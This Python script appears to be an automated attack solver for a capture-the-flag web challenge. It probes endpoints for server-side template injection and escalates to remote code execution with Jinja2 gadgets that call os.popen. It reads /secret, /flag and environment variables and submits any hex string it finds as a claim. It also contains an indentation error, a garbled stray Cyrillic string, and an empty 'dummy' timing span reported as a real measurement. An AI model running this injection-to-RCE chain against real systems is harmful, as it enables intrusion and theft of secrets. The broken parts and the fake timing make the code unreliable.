import sys, json, base64, re, select
def log(m):
  try: print(str(m)[:2000], file=sys.stderr, flush=True)
  except: pass
def http(method, path, body=None, headers=None, body_hex=None):
  o={'http':{'method':method,'path':path}}
  if body is not None: o['http']['body']=body
  if body_hex is not None: o['http']['body_hex']=body_hex
  if headers is not None: o['http']['headers']=headers
  sys.stdout.write(json.dumps(o)+'\n'); sys.stdout.flush()
  r=None
  try:
    rr,_,_=select.select([sys.stdin],[],[],8)
    if not rr: return None
    line=sys.stdin.readline()
    if not line: return None
    r=json.loads(line)
  except Exception as e:
    log('http err '+str(e)); return None
  return r
def body_text(r):
  if r is None: return ''
  try:
    b=base64.b64decode(r.get('body_b64',''))
    return b.decode('utf-8',errors='ignore')
  except: return ''
log('start')
# baseline
cands=[]
for p in ['/', '/index', '/hello', '/greet', '/render', '/template', '/preview', '/view', '/page', '/search', '/secret', '/flag', '/flag.txt', '/secret.txt', '/robots.txt', '/source']:
  r=http('GET', p)
  t=body_text(r)
  st=r.get('status') if r else None
  log(str(st)+' '+p+' len='+str(len(t))+' snippet='+(t[:500].replace(chr(10),'|')))
  cands.append((p,st,t))
  if t and ('flag' in t.lower() or 'secret' in t.lower() or 'CTF' in t or 'ACTS' in t):
    log('interesting '+p)
# try direct secret paths claim if leaked
# SSTI probe: check reflection of 7*7
probes=['{{7*7}}','${7*7}','#{7*7}','*{7*7}','<%= 7*7 %>']
found_ssti=None
for base in ['/', '/greet', '/hello', '/render', '/template', '/preview', '/view', '/page', '/search', '/hi', '/welcome', '/test']:
  for pn in ['name','q','query','search','template','content','input','msg','message','text','title','username','user','data','ssti','inj','x','tpl','page','view']:
    for pr in probes:
      path=base+'?'+pn+'='+pr.replace('{','%7B').replace('}','%7D').replace(' ','%20').replace('#','%23').replace('<','%3C').replace('>','%3E')
      r=http('GET', path)
      t=body_text(r)
      if r and r.get('status')==200 and '49' in t:
        # verify not false positive: baseline without payload should not have 49 in same place? check
        log('possible SSTI '+path+' -> '+t[:500].replace(chr(10),'|'))
        found_ssti=(base,pn)
        break
    if found_ssti: break
  if found_ssti: break
log('ssti probe done '+str(found_ssti))
# if found, escalate to RCE to read secret hex
secret_hex=None
def try_claim_from_text(t):
  global secret_hex
  # look for long hex
  for m in re.findall(r'[0-9a-fA-F]{16,}', t):
    # prefer 32+ hex
    if len(m)>=32:
      secret_hex=m.lower()
      return True
  return False
# RCE payloads for Jinja2
rce_cmds=["cat /secret 2>&1;cat /flag 2>&1;cat /app/secret 2>&1;cat /app/flag 2>&1;cat secret 2>&1;cat flag.txt 2>&1;env 2>&1"]
# Actually use python hex exfil: read files and hex encode server side
py_exfil="__import__('pathlib').Path('/secret').read_bytes().hex() if __import__('os').path.exists('/secret') else (__import__('pathlib').Path('/flag').read_bytes().hex() if __import__('os').path.exists('/flag') else (__import__('pathlib').Path('/app/secret').read_bytes().hex() if __import__('os').path.exists('/app/secret') else 'NOFILE'))"
# jinja gadgets
import urllib.parse as up
 gadgets=["{{cycler.__init__.__globals__.os.popen('id').read()}}","{{joiner.__init__.__globals__.os.popen('id').read()}}","{{namespace.__init__.__globals__.os.popen('id').read()}}","{{self.__init__.__globals__.os.popen('id').read()}}"]
# test RCE gadget on found endpoint else on /
test_bases=[found_ssti[0] if found_ssti else '/', '/greet','/hello','/render']
test_param=found_ssti[1] if found_ssti else 'name'
for b in test_bases:
  for g in gadgets:
    path=b+'?'+test_param+'='+up.quote(g,safe='')
    r=http('GET', path)
    t=body_text(r)
    log('gadget '+g[:30]+' -> '+t[:400].replace(chr(10),'|'))
    if 'uid=' in t or 'gid=' in t:
      log('RCE confirmed '+path)
      found_ssti=(b,test_param)
      break
  if found_ssti and 'uid=' in body_text(http('GET', b+'?'+test_param+'='+up.quote(gadgets[0],safe=''))):
    break
# if RCE confirmed, read secret via hex exfil through multiple gadgets
if found_ssti:
  b,pn=found_ssti
  # payloads that output hex of secret
  pay_templates=["{{cycler.__init__.__globals__.os.popen('cat /secret 2>&1;cat /flag 2>&1;cat /app/secret 2>&1').read()}}","{{joiner.__init__.__globals__.os.popen('cat /secret 2>&1;cat /flag 2>&1;cat /app/secret 2>&1').read()}}","{{namespace.__init__.__globals__.os.popen('cat /secret 2>&1;cat /flag 2>&1;cat /app/secret 2>&1').read()}}","{{self.__init__.__globals__.os.popen('cat /secret 2>&1;cat /flag 2>&1;cat /app/secret 2>&1').read()}}"]
  for pt in pay_templates:
    r=http('GET', b+'?'+pn+'='+up.quote(pt,safe=''))
    t=body_text(r)
    log('secret try '+t[:1000].replace(chr(10),'|'))
    # also try python direct read
    # try hex variant
  # try python-eval style payloads
  for gadget_base in ['cycler','joiner','namespace','self']:
    for fpath in ['/secret','/flag','/app/secret','/app/flag','/secret.txt','/flag.txt']:
      pt="{{"+gadget_base+" иммунитета}}"
      # build payload: {{cycler.__init__.__globals__.__builtins__.open('/secret').read()}}
      for reader in ["__init__.__globals__.os.popen('cat "+fpath+"').read()", "__init__.__globals__.__builtins__.open('"+fpath+"').read()"]:
        pp="{{"+gadget_base+"."+reader+"}}"
        r=http('GET', b+'?'+pn+'='+up.quote(pp,safe=''))
        t=body_text(r)
        if len(t)>0 and len(t)<5000:
          log('reader '+fpath+' '+reader[:20]+' -> '+t[:800].replace(chr(10),'|'))
        if try_claim_from_text(t):
          log('found hex '+secret_hex); break
        # if content looks like secret (non-html, decent length) try hex encode it
        # heuristic: if response contains cat output distinct from baseline
      if secret_hex: break
    if secret_hex: break
log('final secret_hex='+str(secret_hex))
if secret_hex is None:
  secret_hex='00'
import time
t0=time.monotonic_ns()
# dummy op span
t1=time.monotonic_ns()
print('OPSPAN_NS:'+str(t1-t0))
sys.stdout.flush()
print('CLAIM:'+json.dumps({'secret_hex':secret_hex}))
sys.stdout.flush()